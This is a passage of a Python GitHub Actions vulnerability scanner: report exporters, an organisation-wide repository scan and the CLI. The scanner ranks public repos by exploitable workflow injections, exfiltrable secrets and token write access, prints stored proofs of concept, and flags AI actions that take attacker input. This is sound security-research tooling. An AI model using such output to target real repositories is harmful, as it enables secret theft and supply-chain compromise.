            for e in f.eliminated_vulns],
        "env_injections": f.env_injections,
        "indirect_injections": f.indirect_vulns,
        "unpinned_actions": f.unpinned_actions,
        "content_hash": f.content_hash,
        "workflow_content": f.workflow_content,
        "query_id": f.query_id,
        "query_name": f.query_name}


def print_summary(findings):
    vc = Counter(f.severity for f in findings)
    total = len(findings)
    print(f"\n{C.BOLD}{'═' * 60}{C.RESET}")
    print(f"  {C.BOLD}RESULTS — {total} findings analyzed{C.RESET}")
    print(f"{C.BOLD}{'═' * 60}{C.RESET}")
    for v in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'AI_INJECTION', 'FALSE_POSITIVE']:
        n = vc.get(v, 0)
        pct = n / total * 100 if total else 0
        bar = '█' * int(pct / 2)
        padded = f"{v:<16}"
        colored = f"{SEV_COLOR.get(v,'')}{padded}{C.RESET}"
        print(f"  {colored} {n:>5}  ({pct:5.1f}%)  {dim(bar)}")
    print(f"{C.BOLD}{'═' * 60}{C.RESET}")

    crits = sorted([f for f in findings if f.severity == 'CRITICAL'], key=lambda f: -f.stars)
    if crits:
        print(f"\n  {C.BOLD}{C.RED}TOP CRITICAL:{C.RESET}")
        for f in crits[:15]:
            secrets = ', '.join(f.secrets_exposed[:3]) or 'GITHUB_TOKEN'
            merged = f' {C.YELLOW}[merged-only]{C.RESET}' if f.merged_only else ''
            print(f"    {f.stars:>6}⭐  {C.BOLD}{f.org_name:<20}{C.RESET} "
                  f"{f.repo:<40} {dim(f'[{secrets}]')}{merged}")

    org_counts = defaultdict(lambda: {"count": 0, "crits": 0, "repos": set()})
    for f in findings:
        if f.severity == 'FALSE_POSITIVE': continue
        org_counts[f.org_name]["count"] += 1
        org_counts[f.org_name]["repos"].add(f.repo)
        if f.severity == 'CRITICAL': org_counts[f.org_name]["crits"] += 1
    multi = {k: v for k, v in org_counts.items() if len(v["repos"]) > 1}
    if multi:
        print(f"\n  {C.BOLD}ORGS WITH MULTIPLE VULNERABLE REPOS:{C.RESET}")
        for org, data in sorted(multi.items(), key=lambda x: -x[1]['crits']):
            c_label = f'{C.RED}{data["crits"]}C{C.RESET}' if data['crits'] else dim('0C')
            print(f"    {C.BOLD}{org:<25}{C.RESET} {len(data['repos'])} repos, "
                  f"{data['count']} findings ({c_label})")

    env_count = sum(1 for f in findings if f.env_injections)
    indirect_count = sum(1 for f in findings if f.indirect_vulns)
    merged_count = sum(1 for f in findings if f.merged_only)
    echo_count = sum(1 for f in findings if f.has_echo_only)
    heredoc_count = sum(1 for f in findings if f.has_heredoc_only)
    ro_perms_count = sum(1 for f in findings if f.permissions_readonly)
    if any([env_count, indirect_count, merged_count, echo_count, heredoc_count, ro_perms_count]):
        print(f"\n  {C.BOLD}ADDITIONAL SIGNALS:{C.RESET}")
        if env_count: print(f"    {C.YELLOW}⚡{C.RESET} GITHUB_ENV injections: {env_count}")
        if indirect_count: print(f"    {C.YELLOW}🔗{C.RESET} Indirect (step output): {indirect_count}")
        if merged_count: print(f"    {C.CYAN}🔀{C.RESET} Merged-only gate: {merged_count}")
        if echo_count: print(f"    {C.CYAN}📢{C.RESET} Echo-only expressions: {echo_count}")
        if heredoc_count: print(f"    {C.GREEN}📜{C.RESET} Quoted heredoc (mitigated): {heredoc_count}")
        if ro_perms_count: print(f"    {C.GREEN}🔒{C.RESET} Read-only/empty permissions: {ro_perms_count}")
        ai_risk_count = sum(1 for f in findings if f.ai_risk)
        if ai_risk_count: print(f"    {C.MAGENTA}🤖{C.RESET} AI prompt injection risks: {ai_risk_count}")

    fps = [f for f in findings if f.severity == 'FALSE_POSITIVE']
    if fps:
        rules = Counter()
        for f in fps:
            for e in f.eliminated_vulns: rules[e.rule] += 1
        print(f"\n  {dim('FALSE POSITIVE BREAKDOWN:')}")
        for rule, cnt in rules.most_common():
            print(f"    {dim(f'{rule:<20} {cnt}')}")


def _print_finding_terminal(f):
    if f.severity == 'FALSE_POSITIVE':
        return
    secrets_str = ', '.join(f.secrets_exposed[:3]) or 'GITHUB_TOKEN'
    merged = f' {C.YELLOW}[merged-only]{C.RESET}' if f.merged_only else ''
    heredoc = f' {C.GREEN}[heredoc]{C.RESET}' if f.has_heredoc_only else ''
    perms = f' {C.GREEN}[perms:{{}}]{C.RESET}' if f.permissions_readonly else ''
    print(f"\n  {sev(f.severity)}: {C.BOLD}{f.repo}{C.RESET} ({f.stars}⭐){merged}{heredoc}{perms}")
    print(f"     {url_c(f.file_url)}")
    print(f"     {dim('🛡️')}  {url_c(f.security_url)}")
    secrets_at_risk = f.severity in ('CRITICAL', 'HIGH')
    token_useful = not f.permissions_readonly
    if f.secrets_exposed:
        if secrets_at_risk:
            print(f"     🔑 Secrets: {C.RED}{secrets_str}{C.RESET}")
        else:
            print(f"     🔒 Secrets (not exfiltrable): {C.YELLOW}{secrets_str}{C.RESET}")
    if token_useful and secrets_at_risk:
        print(f"     🔑 GITHUB_TOKEN: {C.RED}write access{C.RESET}")
    _ctrl_order = {'FULL_CONTROL': 0, 'UNKNOWN': 1, 'DISPATCH_INPUT': 2,
                   'LIMITED_CONTROL': 3, 'NO_CONTROL': 4}
    show_vulns = sorted(
        [e for e in f.active_vulns if e.control_level != 'NO_CONTROL'],
        key=lambda e: _ctrl_order.get(e.control_level, 5))
    if not show_vulns: show_vulns = f.active_vulns
    seen_exprs = set(); deduped = []
    for e in show_vulns:
        if e.expression not in seen_exprs:
            seen_exprs.add(e.expression); deduped.append(e)
    for e in deduped[:4]:
        echo_tag = f' {C.CYAN}[echo]{C.RESET}' if e.echo_only else ''
        hd_tag = f' {C.GREEN}[heredoc]{C.RESET}' if e.in_heredoc else ''
        lbl = ctrl_label(e.control_level)
        desc = ctrl_explain(e.control_level)
        print(f"     ⚠️  L{e.line}: {e.expression}")
        print(f"         {C.YELLOW}{lbl}{C.RESET}: {dim(desc)}{echo_tag}{hd_tag}")
    if f.poc and f.severity in ('CRITICAL', 'HIGH'):
        print(f"     {C.BOLD}📋 PoC:{C.RESET}")
        for poc_line in f.poc.split('\n'):
            print(f"     {dim(poc_line)}")
    if f.ai_risk:
        for ai in f.ai_risk:
            print(f"     🤖 {C.MAGENTA}AI INJECTION{C.RESET}: L{ai['line']} — {ai['expression']}")


def export_json(findings, outpath):
    out = [finding_to_dict(f) for f in findings]
    data = {"scan_time": datetime.now().isoformat(), "scanner_version": "3.5",
            "total_findings": len(out),
            "summary": dict(Counter(f.severity for f in findings)), "findings": out}
    with open(outpath, 'w', encoding='utf-8') as fp:
        json.dump(data, fp, indent=2)
    print(f"\n{C.GREEN}💾 Exported {len(out)} findings to {outpath}{C.RESET}")


def _h(s):
    return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')


# ── Incremental Markdown writer ──

_md_current_query = {'id': None}

def _md_path_from_json(json_path):
    return json_path.rsplit('.', 1)[0] + '.md'

def _md_init(md_path, query_info=''):
    _md_current_query['id'] = None
    with open(md_path, 'w', encoding='utf-8') as f:
        f.write(f"# GHA Vulnerability Scanner — Live Report\n\n")
        f.write(f"**Generated**: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n")
        if query_info: f.write(f"**Queries**: {query_info}\n\n")
        f.write("---\n\n")

def _md_append_finding(md_path, f):
    with open(md_path, 'a', encoding='utf-8') as fp:
        s = f.severity
        if s == 'FALSE_POSITIVE' and not f.ai_risk:
            return
        if f.query_id != _md_current_query['id'] and f.query_id >= 0:
            _md_current_query['id'] = f.query_id
            fp.write(f"\n# Q{f.query_id}: {f.query_name}\n\n")
        sev_emoji = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟣', 'LOW': '🔵',
                     'AI_INJECTION': '🤖', 'FALSE_POSITIVE': '⚪'}.get(s, '⚪')
        fp.write(f"## {sev_emoji} {s}: [{f.repo}]({f.repo_url}) ({f.stars}⭐)\n\n")
        fp.write(f"- **Workflow**: [{f.path}]({f.file_url})\n")
        fp.write(f"- **Security**: [{f.repo}/security]({f.security_url})\n")
        if f.triggers:
            triggers = ', '.join(f"{t}: [{', '.join(e)}]" for t, e in f.triggers.items())
            fp.write(f"- **Triggers**: {triggers}\n")
        if f.who_can_trigger:
            fp.write(f"- **Who can trigger**: {f.who_can_trigger}\n")
        tags = []
        if f.merged_only: tags.append('`merged-only`')
        if f.has_heredoc_only: tags.append('`heredoc`')
        if f.permissions_readonly: tags.append('`perms:{}`')
        if f.has_echo_only: tags.append('`echo-only`')
        if tags: fp.write(f"- **Tags**: {' '.join(tags)}\n")
        if f.secrets_exposed:
            secrets_at_risk = s in ('CRITICAL', 'HIGH')
            icon = '🔑' if secrets_at_risk else '🔒'
            label = 'exfiltrable' if secrets_at_risk else 'present but not exfiltrable'
            fp.write(f"- {icon} **Secrets** ({label}): `{'`, `'.join(f.secrets_exposed[:6])}`\n")
        fp.write('\n')
        if f.active_vulns:
            fp.write("### Vulnerable Expressions\n\n")
            fp.write("| Line | Expression | Control | Notes |\n")
            fp.write("|------|-----------|---------|-------|\n")
            for e in f.active_vulns[:6]:
                label = ctrl_label(e.control_level)
                notes = []
                if e.echo_only: notes.append('echo-only')
                if e.in_heredoc: notes.append('heredoc')
                notes_str = ', '.join(notes) or '—'
                expr_escaped = e.expression.replace('|', '\\|')
                fp.write(f"| L{e.line} | `{expr_escaped}` | {label} | {notes_str} |\n")
            fp.write('\n')
        if f.poc:
            fp.write("### Proof of Concept\n\n```\n")
            fp.write(f.poc)
            fp.write("\n```\n\n")
        if f.ai_risk:
            fp.write("### 🤖 AI Prompt Injection Risk\n\n")
            for ai in f.ai_risk:
                tainted = ', '.join(ai['tainted_fields'][:3])
                fp.write(f"- **L{ai['line']}**: `{ai['expression']}`\n")
                fp.write(f"  - AI action `{ai['ai_action']}` receives attacker input ({tainted})\n")
            fp.write('\n')
        if f.explanation and s != 'FALSE_POSITIVE':
            fp.write(f"> {f.explanation}\n\n")
        fp.write("---\n\n")

def _md_finalize(md_path, findings):
    vc = Counter(f.severity for f in findings)
    with open(md_path, 'a', encoding='utf-8') as fp:
        fp.write("## Summary\n\n")
        fp.write("| Severity | Count | % |\n")
        fp.write("|----------|------:|----:|\n")
        total = len(findings)
        for s in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'AI_INJECTION', 'FALSE_POSITIVE']:
            cnt = vc.get(s, 0)
            pct = f'{cnt/total*100:.1f}' if total else '0'
            fp.write(f"| {s} | {cnt} | {pct}% |\n")
        fp.write(f"\n**Total**: {total} findings\n\n")


def export_html(findings, outpath):
    sev_colors = {'CRITICAL':'#991b1b','HIGH':'#dc2626','MEDIUM':'#ea580c',
                  'LOW':'#ca8a04','AI_INJECTION':'#7c3aed','FALSE_POSITIVE':'#6b7280'}
    vc = Counter(f.severity for f in findings); total = len(findings)
    rows = []
    query_order = []
    query_seen = set()
    for f in findings:
        qkey = (f.query_id, f.query_name)
        if qkey not in query_seen:
            query_seen.add(qkey); query_order.append(qkey)

    sorted_findings = sorted(findings,
        key=lambda x: (x.query_id if x.query_id >= 0 else 999,
                       -['FALSE_POSITIVE','LOW','AI_INJECTION','MEDIUM','HIGH','CRITICAL'].index(x.severity)
                       if x.severity in ['FALSE_POSITIVE','LOW','AI_INJECTION','MEDIUM','HIGH','CRITICAL'] else -99,
                       -x.stars))

    current_qid = None
    for f in sorted_findings:
        if f.query_id != current_qid and f.query_id >= 0:
            current_qid = f.query_id
            rows.append(f'<tr class="query-header" data-query="{f.query_id}"><td colspan="8" '
                f'style="background:#161b22;padding:12px 8px;font-size:1.1em;font-weight:bold;'
                f'color:#58a6ff;border-top:2px solid #58a6ff" id="q{f.query_id}">'
                f'Q{f.query_id}: {_h(f.query_name)}</td></tr>')

        secrets = ', '.join(f.secrets_exposed[:4]) or '\u2014'
        exprs_html = '<br>'.join(
            f'L{e.line}: <code>{_h(e.expression)}</code> [{_h(ctrl_label(e.control_level))}] ({e.context})'
            + (' <span class="tag echo">echo</span>' if e.echo_only else '')
            for e in f.active_vulns[:5])
        if not exprs_html and f.env_injections:
            exprs_html = '<br>'.join(f'L{e["line"]}: <code>{_h(e["expression"])}</code> [{e["type"]}]'
                                     for e in f.env_injections[:3])
        tags = ''
        if f.merged_only: tags += ' <span class="tag merged">merged-only</span>'
        if f.has_echo_only: tags += ' <span class="tag echo">echo</span>'
        if f.has_heredoc_only: tags += ' <span class="tag heredoc">heredoc</span>'
        if f.permissions_readonly: tags += ' <span class="tag perms">perms:{}</span>'
        if f.env_injections: tags += ' <span class="tag env">ENV</span>'
        if f.indirect_vulns: tags += ' <span class="tag ind">indirect</span>'
        color = sev_colors.get(f.severity, '#666')
        rows.append(f'<tr data-sev="{f.severity}" data-query="{f.query_id}"><td><span class="sev" style="background:{color}">{f.severity}</span>{tags}</td>'
            f'<td class="stars">{f.stars:,}</td><td><strong>{_h(f.org_name)}</strong></td>'
            f'<td><a href="{f.repo_url}" target="_blank">{_h(f.repo)}</a><br>'
            f'<small><a href="{f.file_url}" target="_blank">📄 workflow</a> · '
            f'<a href="{f.security_url}" target="_blank">🛡️ security</a></small></td>'
            f'<td class="sm">{_h(f.who_can_trigger)}</td><td class="sm">{_h(secrets)}</td>'
            f'<td class="sm">{exprs_html}</td><td class="sm">{_h(f.explanation[:200])}</td></tr>')
    summary = ' · '.join(f'<span style="color:{sev_colors[s]}">{s}: {vc.get(s,0)}</span>'
        for s in ['CRITICAL','HIGH','MEDIUM','LOW','AI_INJECTION','FALSE_POSITIVE'])
    html = f'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>GHA Vulnerability Scan</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
h1{{font-size:1.4em;margin-bottom:8px;color:#f0f6fc}}.summary{{margin-bottom:16px;font-size:.95em}}
.filters{{margin-bottom:12px;display:flex;gap:8px;flex-wrap:wrap}}
.filters button{{padding:4px 12px;border:1px solid #30363d;border-radius:4px;background:#161b22;color:#c9d1d9;cursor:pointer;font-size:.85em}}
.filters button:hover,.filters button.active{{background:#21262d;border-color:#58a6ff;color:#58a6ff}}
table{{width:100%;border-collapse:collapse;font-size:.82em}}
th{{background:#161b22;padding:8px 6px;text-align:left;border-bottom:2px solid #30363d;position:sticky;top:0}}
td{{padding:6px;border-bottom:1px solid #21262d;vertical-align:top}}tr:hover{{background:#161b22}}
.sev{{padding:2px 8px;border-radius:3px;color:#fff;font-weight:bold;font-size:.8em;white-space:nowrap}}
.tag{{padding:1px 5px;border-radius:3px;font-size:.7em;margin-left:3px}}
.tag.merged{{background:#854d0e;color:#fef3c7}}.tag.echo{{background:#065f46;color:#d1fae5}}
.tag.env{{background:#7c2d12;color:#fed7aa}}.tag.ind{{background:#312e81;color:#c7d2fe}}
.tag.heredoc{{background:#064e3b;color:#a7f3d0}}.tag.perms{{background:#064e3b;color:#a7f3d0}}
.stars{{text-align:right;font-weight:bold;color:#e3b341}}
a{{color:#58a6ff;text-decoration:none}}a:hover{{text-decoration:underline}}
.sm{{font-size:.82em}}code{{background:#1c2128;padding:1px 4px;border-radius:3px;font-size:.9em}}
.hidden{{display:none}}</style></head><body>
<h1>🔒 GHA Vulnerability Scan Report — by <a href="https://www.linkedin.com/in/sergio-cabrera-878766239/">Sergio Cabrera</a></h1>
<div class="summary">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')} · Scanner v3.5 · {total} findings · {summary}</div>
<div class="filters">
<button class="active" onclick="F('all',this)">All ({total})</button>
<button onclick="F('CRITICAL',this)">CRITICAL ({vc.get('CRITICAL',0)})</button>
<button onclick="F('HIGH',this)">HIGH ({vc.get('HIGH',0)})</button>
<button onclick="F('MEDIUM',this)">MEDIUM ({vc.get('MEDIUM',0)})</button>
<button onclick="F('LOW',this)">LOW ({vc.get('LOW',0)})</button>
<button onclick="F('AI_INJECTION',this)">AI ({vc.get('AI_INJECTION',0)})</button>
<button onclick="F('FALSE_POSITIVE',this)">FP ({vc.get('FALSE_POSITIVE',0)})</button></div>
<table><tr><th>Severity</th><th>Stars</th><th>Org</th><th>Repository</th><th>Trigger</th><th>Secrets</th><th>Expressions</th><th>Explanation</th></tr>
{''.join(rows)}</table>
<script>function F(s,b){{document.querySelectorAll('.filters button').forEach(x=>x.classList.remove('active'));b.classList.add('active');
document.querySelectorAll('tr[data-sev],tr.query-header').forEach(r=>r.classList.toggle('hidden',s!=='all'&&r.dataset.sev!==s))}}</script></body></html>'''
    with open(outpath, 'w', encoding='utf-8') as fp: fp.write(html)
    print(f"{C.GREEN}📊 HTML report: {outpath}{C.RESET}")


def scan_org(org_name, max_repos=500, min_stars=0, use_clone=True):
    print(f"\n{C.BOLD}🏢 Scanning organization: {org_name}{C.RESET}")
    print(f"   Fetching repo list (max {max_repos})...\n")
    repos = []
    page = 1
    per_page = 100
    while len(repos) < max_repos:
        data, _, _ = api_request(
            f"https://api.github.com/orgs/{org_name}/repos"
            f"?per_page={per_page}&page={page}&type=public&sort=stars&direction=desc"
        )
        if not data or not isinstance(data, list) or len(data) == 0:
            break
        repos.extend(data)
        if len(data) < per_page:
            break
        page += 1
    repos = repos[:max_repos]
    print(f"   📦 Found {len(repos)} public repos\n")
    if not repos:
        print(f"   {C.RED}❌ No repos found for org {org_name}{C.RESET}")
        return []
    active_repos = []
    for r in repos:
        if r.get('fork') or r.get('archived'): continue
        if r.get('stargazers_count', 0) < min_stars: continue
        active_repos.append(r)
    print(f"   📊 {len(active_repos)} active repos\n")
    all_findings = []
    for ri, repo_data in enumerate(active_repos):
        owner = repo_data['owner']['login']
        repo_name_short = repo_data['name']
        full_name = repo_data['full_name']
        stars = repo_data.get('stargazers_count', 0)
        print(f"   [{ri+1}/{len(active_repos)}] {full_name} ⭐{stars}")
        clone_path = None
        workflow_files = []
        if use_clone:
            clone_path = git_clone_repo(owner, repo_name_short)
            if clone_path:
                workflow_files = get_all_workflow_files(clone_path)
        if not workflow_files and not clone_path:
            data, status, _ = api_request(
                f"https://api.github.com/repos/{full_name}/contents/.github/workflows"
            )
            if data and isinstance(data, list):
                workflow_files = [
                    f".github/workflows/{f['name']}" for f in data
                    if f['name'].endswith(('.yml', '.yaml'))
                    and not any(f['name'].endswith(ext) for ext in SKIP_EXTENSIONS)
                ]
        if not workflow_files:
            print(f"      📭 No workflows"); continue
        print(f"      📄 {len(workflow_files)} workflow(s)")
        for wf_path in workflow_files:
            content = None
            if clone_path:
                content = get_file_content_from_clone(clone_path, wf_path)
            if not content:
                content = get_file_content(owner, repo_name_short, wf_path)
            if not content: continue
            f = Finding(
                repo=full_name, path=wf_path, stars=stars,
                org_name=owner, org_type='Organization',
                repo_url=f"https://github.com/{full_name}",
                file_url=f"https://github.com/{full_name}/blob/HEAD/{wf_path}",
                security_url=f"https://github.com/{full_name}/security",
                workflow_content=content,
                content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
                query_id=-1, query_name='org-scan',
            )
            f._clone_path = clone_path
            f._other_workflows = {}
            if clone_path:
                other_wfs = {}
                for owf in workflow_files:
                    if owf != wf_path:
                        owf_content = get_file_content_from_clone(clone_path, owf)
                        if owf_content: other_wfs[owf] = owf_content
                f._other_workflows = other_wfs
            analyze(f)
            if f.severity and f.severity != 'FALSE_POSITIVE':
                all_findings.append(f)
                _print_finding_terminal(f)
        if ri < len(active_repos) - 1 and ri % 10 == 9:
            print(f"\n      {dim('⏳ Brief pause...')}"); time.sleep(2)
    return all_findings


# ════════════════════════════════════════════════════════════════════
#  CLI (main entry point)
# ════════════════════════════════════════════════════════════════════

def main():
    from gha_vuln_scanner import __version__
    parser = argparse.ArgumentParser(
        description=f'GHA Vulnerability Scanner v{__version__} — by Sergio Cabrera (https://linkedin.com/in/sergio-cabrera-878766239/)')
    parser.add_argument('--query', '-q', type=int, help='Query number (1-43)')
    parser.add_argument('--custom', '-c', type=str, help='Custom search query')
    parser.add_argument('--all', action='store_true', help='Run all queries')
    parser.add_argument('--start-page', '-s', type=int, default=1)
    parser.add_argument('--end-page', '-e', type=int, default=10)
    parser.add_argument('--no-subdivide', action='store_true')
    parser.add_argument('--min-stars', type=int, default=0, help='Min stars filter')
    parser.add_argument('--limit', '-l', type=int, default=0)
    parser.add_argument('--offline', type=str, help='Analyze existing scan JSON')
    parser.add_argument('-o', '--output', type=str, help='Output JSON path')
    parser.add_argument('--html', type=str, help='Output HTML report path')
    parser.add_argument('--clone', action='store_true')
    parser.add_argument('--org', type=str, help='Scan all repos in a GitHub org')
    parser.add_argument('--org-max-repos', type=int, default=500)
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--verdict', nargs='+')
    parser.add_argument('--version', action='version', version=f'gha-vuln-scanner {__version__}')
    args = parser.parse_args()

    global _USE_CLONE, _CLONE_DIR

    if args.offline:
        print(f"{C.BOLD}📂 Offline mode: {args.offline}{C.RESET}")
        with open(args.offline, encoding='utf-8') as fp:
            data = json.load(fp)
        raw = data.get('findings', data if isinstance(data, list) else [])
        if args.limit > 0: raw = raw[:args.limit]
        findings = [analyze_offline_finding(rf) for rf in raw]
        md_path = _md_path_from_json(args.output or args.offline)
        _md_init(md_path, f'offline: {args.offline}')
        for f in findings: _md_append_finding(md_path, f)
        _md_finalize(md_path, findings)
        print_summary(findings)
        if args.output: export_json(findings, args.output)
        if args.html: export_html(findings, args.html)
        return

    if args.clone or args.org:
        _USE_CLONE = True
        _CLONE_DIR = os.path.join(os.getcwd(), 'cloned_repos')
        os.makedirs(_CLONE_DIR, exist_ok=True)

    if args.org:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        out = args.output or f"gha_scan_org_{args.org}_{ts}.json"
        md_path = _md_path_from_json(out)
        _md_init(md_path, f'org: {args.org}')
        findings = scan_org(args.org, max_repos=args.org_max_repos,
                           min_stars=args.min_stars, use_clone=_USE_CLONE)
        if findings:
            findings.sort(key=lambda f: -f.stars)
            for f in findings: _md_append_finding(md_path, f)
            _md_finalize(md_path, findings)
            print_summary(findings)
            export_json(findings, out)
            if args.html: export_html(findings, args.html)
        else:
            print(f"\n📭 No vulnerabilities found in {args.org}")
        if _CLONE_DIR and os.path.exists(_CLONE_DIR):
            _rmtree_safe(_CLONE_DIR)
        return

    if args.all: query_ids = sorted(QUERIES.keys())
    elif args.query:
        if args.query not in QUERIES:
            print(f"{C.RED}❌ Unknown query {args.query}. Valid: 1-{max(QUERIES.keys())}{C.RESET}")
            sys.exit(1)
        query_ids = [args.query]
    elif args.custom:
        QUERIES[0] = ("Custom", args.custom); query_ids = [0]
    else:
        parser.print_help()
        print(f"\n{C.BOLD}Queries:{C.RESET}")
        for qn, (name, _) in sorted(QUERIES.items()):
            print(f"  {qn:>2}: {name}")
        sys.exit(0)

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    label = 'all' if args.all else (f'q{args.query}' if args.query else 'custom')
    out = args.output or f"gha_scan_{label}_{ts}.json"
    md_path = _md_path_from_json(out)
    _md_init(md_path, ', '.join(f"Q{q}" for q in query_ids))

    all_findings = []
    global_seen = set()

    for qi, qid in enumerate(query_ids):
        qname = QUERIES[qid][0]
        print(f"\n{'═'*60}\n  {C.BOLD}[{qi+1}/{len(query_ids)}] Q{qid}: {qname}{C.RESET}\n{'═'*60}")
        candidates = discover([qid], args.start_page, args.end_page,
                              not args.no_subdivide, limit=args.limit)
        if not candidates: continue
        new_candidates = []
        for c in candidates:
            key = f"{c['repo']}:{c['path']}"
            if key not in global_seen:
                global_seen.add(key); new_candidates.append(c)
        candidates = new_candidates
        if not candidates: continue
        enriched = enrich(candidates, min_stars=args.min_stars)
        if not enriched: continue
        for f in enriched:
            analyze(f)
            all_findings.append(f)
            _md_append_finding(md_path, f)
            _print_finding_terminal(f)
        export_json(all_findings, out)
        if qi < len(query_ids) - 1:
            time.sleep(15)

    if not all_findings:
        print("📭 No findings."); return
    all_findings.sort(key=lambda f: -f.stars)
    _md_finalize(md_path, all_findings)
    print_summary(all_findings)
    export_json(all_findings, out)
    if args.html: export_html(all_findings, args.html)
    if _USE_CLONE and _CLONE_DIR and os.path.exists(_CLONE_DIR):
        _rmtree_safe(_CLONE_DIR)


if __name__ == '__main__':
    main()
